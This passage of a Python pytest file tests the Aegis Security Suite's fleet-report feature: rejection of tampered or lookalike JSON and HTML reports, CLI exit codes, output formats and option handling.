        assert not is_aegis_report(page.encode("utf-8"), "html")
    assert not is_aegis_report(b"\xff\xfe\x00bad utf8" + F.render_html(build()).encode("utf-8"), "html")


def _tamper_json(edit):
    d = json.loads(F.render_json(hostile_fleet()))
    edit(d)
    return json.dumps(d, indent=2).encode("utf-8")


@pytest.mark.parametrize("edit", [
    lambda d: d.update(payload=CRADLE),
    lambda d: d["hosts"][0].update(extra="x"),
    lambda d: d["hosts"][0]["findings"][0].update(evidence={"a": CRADLE}),
    lambda d: d["common_issues"][0].update(extra=[]),
    lambda d: d["totals"].update(extra=1),
    lambda d: d["skipped"].update(extra=1),
    lambda d: d.pop("skipped"),
    lambda d: d["hosts"][0].pop("counts"),
    lambda d: d["hosts"][0]["counts"].pop("info"),
    lambda d: d["hosts"][0].update(score="100"),
    lambda d: d["hosts"][0].update(score=True),
    lambda d: d["hosts"][0].update(hostname=["a"]),
    lambda d: d["hosts"][0].update(stale="no"),
    lambda d: d["hosts"][0].update(trend=[{"date": "2026-10-16", "score": 1, "x": 1}]),
    lambda d: d["hosts"][0].update(actions=[1]),
    lambda d: d.update(hosts={}),
    lambda d: d.update(common_issues=None),
    lambda d: d.update(generator="Other Tool"),
    lambda d: d.update(report="scan"),
    lambda d: d.update(schema=2),
    lambda d: d.update(min_severity="apocalyptic"),
    lambda d: d.update(generated=5),
    lambda d: d["totals"].update(hosts="4"),
    lambda d: d["skipped"].update(files=[{"file": "a"}]),
])
def test_tampered_fleet_json_is_not_recognised(edit):
    assert is_aegis_report(F.render_json(hostile_fleet()).encode("utf-8"), "json")
    assert not is_aegis_report(_tamper_json(edit), "json")


def test_lookalike_fleet_json_is_judged_on_its_structure_not_the_marker():
    assert not is_aegis_report(b'{"generator": "Aegis Security Suite", "report": "fleet"}', "json")
    assert not is_aegis_report(b'{"generator": "Aegis Security Suite", "report": "fleet", "hosts": [', "json")
    assert not F.is_fleet_json([]) and not F.is_fleet_json(None) and not F.is_fleet_json({})
    nested = b'{"generator": "Aegis Security Suite", "report": "fleet", "x": ' + b"[" * 100000 + b"]" * 100000 + b"}"
    assert not is_aegis_report(nested, "json")  # absurd nesting is a "no", not an exception


# --------------------------------------------------------------------------- CLI

def cli(*argv):
    from aegis.cli import main

    return main(["fleet", *map(str, argv)])


def write_fleet_folder(folder: Path, *, high=True):
    now = dt.datetime.now().replace(microsecond=0)
    save(folder, "PC-01.json", scan("PC-01", (now - dt.timedelta(days=1)).isoformat(), [A(), B()] if high else [B()]))
    save(folder, "PC-01-old.json", scan("PC-01", (now - dt.timedelta(days=8)).isoformat(), [B()]))
    save(folder, "PC-02.json", scan("PC-02", (now - dt.timedelta(days=40)).isoformat(), [D()], os_name="linux"))
    (folder / "junk.json").write_text("{}", encoding="utf-8")


def test_cli_writes_the_page_and_exits_1_when_a_host_has_high_findings(tmp_path, capsys):
    write_fleet_folder(tmp_path / "share")
    out = tmp_path / "fleet.html"
    assert cli(tmp_path / "share", "-o", out, "--since", 14) == 1
    shown = capsys.readouterr().out
    assert "Fleet: 2 hosts, 1 need attention" in shown and "1 with no scan in the last 14 days" in shown
    assert "Skipped 1 file that is not an Aegis scan result." in shown and f"Fleet overview written to {out}" in shown
    page = out.read_text(encoding="utf-8")
    assert "PC-01" in page and "PC-02" in page and 'class="pill stale"' in page and is_aegis_report(page.encode("utf-8"), "html")
    assert "Skipped 1 file that is not an Aegis scan result." in page


def test_cli_exit_codes_follow_fail_on(tmp_path, capsys):
    write_fleet_folder(tmp_path / "share", high=False)  # only medium findings
    assert cli(tmp_path / "share", "-o", tmp_path / "a.html") == 0
    assert cli(tmp_path / "share", "-o", tmp_path / "a.html", "--fail-on", "medium") == 1
    assert cli(tmp_path / "share", "-o", tmp_path / "a.html", "--fail-on", "critical") == 0
    write_fleet_folder(tmp_path / "bad")
    assert cli(tmp_path / "bad", "-o", tmp_path / "a.html", "--fail-on", "critical") == 0
    assert cli(tmp_path / "bad", "-o", tmp_path / "a.html", "--fail-on", "high") == 1
    capsys.readouterr()


def test_cli_exit_2_when_there_is_nothing_valid_to_read(tmp_path, capsys):
    (tmp_path / "x").mkdir()
    (tmp_path / "x" / "other.json").write_text("{}", encoding="utf-8")
    assert cli(tmp_path / "x", "-o", tmp_path / "out.html") == 2
    assert "no Aegis scan results found (1 file(s) skipped)" in capsys.readouterr().out
    assert not (tmp_path / "out.html").exists()
    assert cli(tmp_path / "missing") == 2 and cli(tmp_path / "empty-never-made", tmp_path / "x") == 2
    shown = capsys.readouterr().out
    assert "warning: no such file or folder:" in shown and "no Aegis scan results found" in shown
    (tmp_path / "empty").mkdir()
    assert cli(tmp_path / "empty") == 2


def test_cli_missing_path_is_a_warning_when_other_paths_have_results(tmp_path, capsys):
    write_fleet_folder(tmp_path / "share")
    assert cli(tmp_path / "share", tmp_path / "gone", "-o", tmp_path / "o.json") == 1
    out = capsys.readouterr().out
    assert f"warning: no such file or folder: {tmp_path / 'gone'}" in out
    assert json.loads((tmp_path / "o.json").read_text(encoding="utf-8"))["skipped"]["paths_not_found"] == [str(tmp_path / "gone")]


def test_cli_output_formats_by_extension(tmp_path, capsys):
    write_fleet_folder(tmp_path / "share")
    for name in ("o.json", "o.csv", "o.html"):
        assert cli(tmp_path / "share", "-o", tmp_path / name) == 1
    d = json.loads((tmp_path / "o.json").read_text(encoding="utf-8"))
    assert d["report"] == "fleet" and [h["hostname"] for h in d["hosts"]] == ["PC-01", "PC-02"] and d["since_days"] is None
    assert d["skipped"]["count"] == 1 and d["totals"]["results"] == 3 and d["hosts"][0]["scans"] == 2
    rows = list(csv.reader((tmp_path / "o.csv").read_text(encoding="utf-8").splitlines()))
    assert rows[0][0] == "hostname" and [r[0] for r in rows[1:]] == ["PC-01", "PC-02"] and rows[1][12] == "no"
    assert (tmp_path / "o.html").read_text(encoding="utf-8").startswith("<!doctype html>")
    assert cli(tmp_path / "share", "-o", tmp_path / "o.pdf") == 2
    assert "unsupported fleet report format" in capsys.readouterr().out
    (tmp_path / "isdir").mkdir()
    assert cli(tmp_path / "share", "-o", tmp_path / "isdir") == 2  # cannot write over a folder: an error, not a traceback


def test_cli_default_output_goes_to_the_reports_folder(tmp_path, aegis_home, capsys):
    write_fleet_folder(tmp_path / "share")
    assert cli(tmp_path / "share") == 1
    out = aegis_home / "reports" / "fleet.html"
    assert out.is_file() and "Fleet overview written to " in capsys.readouterr().out
    assert is_aegis_report(out.read_bytes(), "html")


def test_cli_min_severity_and_recursive(tmp_path, capsys):
    write_fleet_folder(tmp_path / "share" / "pcs")
    save(tmp_path / "share" / "pcs" / "lab", "LAB-1.json", scan("LAB-1", dt.datetime.now().isoformat(timespec="seconds"), [E()]))
    assert cli(tmp_path / "share", "-o", tmp_path / "o.json") == 2  # nothing directly in `share`
    assert cli(tmp_path / "share", "-o", tmp_path / "o.json", "--recursive", "--min-severity", "low") == 1
    d = json.loads((tmp_path / "o.json").read_text(encoding="utf-8"))
    assert sorted(h["hostname"] for h in d["hosts"]) == ["LAB-1", "PC-01", "PC-02"] and d["min_severity"] == "low"
    assert any(c["rule_id"] == "R-E" for c in d["common_issues"])
    capsys.readouterr()


@pytest.mark.parametrize("days", ["0", "-3", "soon"])
def test_cli_rejects_a_bad_since(tmp_path, days, capsys):
    with pytest.raises(SystemExit) as exc:
        cli(tmp_path, "--since", days)
    assert exc.value.code == 2
    assert "--since" in capsys.readouterr().err
